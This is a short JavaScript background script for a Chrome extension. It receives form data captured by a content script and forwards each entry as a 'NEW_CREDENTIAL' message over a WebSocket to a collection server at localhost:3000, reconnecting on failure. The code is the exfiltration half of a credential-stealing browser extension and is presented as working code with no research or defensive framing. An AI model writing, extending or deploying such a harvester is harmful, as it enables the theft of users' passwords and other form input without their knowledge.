
// This is the background script for the Chrome extension
// It will handle the communication with the server and the content script

// Listen for messages from the content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'CAPTURED_FORM_DATA') {
    // Forward the captured form data to the server
    sendToServer(message.data);
    sendResponse({ success: true });
  }
  
  return true; // indicates that we will send a response asynchronously
});

// Function to send data to the server
function sendToServer(data) {
  // In a real-world scenario, you would send the data to your server here
  // using fetch or WebSockets
  console.log('Sending data to server:', data);
  
  // Example using WebSocket:
  if (websocket && websocket.readyState === WebSocket.OPEN) {
    websocket.send(JSON.stringify({
      type: 'NEW_CREDENTIAL',
      credential: data
    }));
  }
}

// Set up WebSocket connection
let websocket = null;
let reconnectAttempts = 0;
const maxReconnectAttempts = 5;
const reconnectDelay = 3000;

function connectWebSocket() {
  const serverUrl = 'ws://localhost:3000';
  
  websocket = new WebSocket(serverUrl);
  
  websocket.onopen = () => {
    console.log('Connected to server');
    reconnectAttempts = 0;
  };
  
  websocket.onmessage = (event) => {
    const data = JSON.parse(event.data);
    console.log('Message from server:', data);
  };
  
  websocket.onclose = () => {
    console.log('Disconnected from server');
    
    if (reconnectAttempts < maxReconnectAttempts) {
      reconnectAttempts++;
      setTimeout(connectWebSocket, reconnectDelay);
    }
  };
  
  websocket.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
}

// Connect to WebSocket when the extension is loaded
connectWebSocket();
